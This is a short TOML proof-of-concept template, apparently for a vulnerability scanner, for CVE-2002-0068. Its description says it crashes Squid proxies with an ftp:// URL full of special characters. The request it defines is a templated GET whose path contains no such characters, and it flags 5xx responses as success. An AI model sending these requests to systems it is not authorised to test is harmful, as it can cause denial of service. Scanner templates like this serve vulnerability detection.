[info]
author = "ave"
description = "向Squid代理发送包含大量特殊字符的ftp:// URL，触发缓冲区溢出导致拒绝服务"
id = "POC-AVE-2002-0137"
name = "CVE-2002-0068 PoC"
severity = "high"
tags = ["ave-2002-0137"]
vuln_id = [
    "CVE-2002-0068",
    "AVE-2002-0137",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/ftp://{{Hostname}}/{{Path}}"
protocol = "http"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
status = [
    500,
    502,
    503,
]
type = "status"
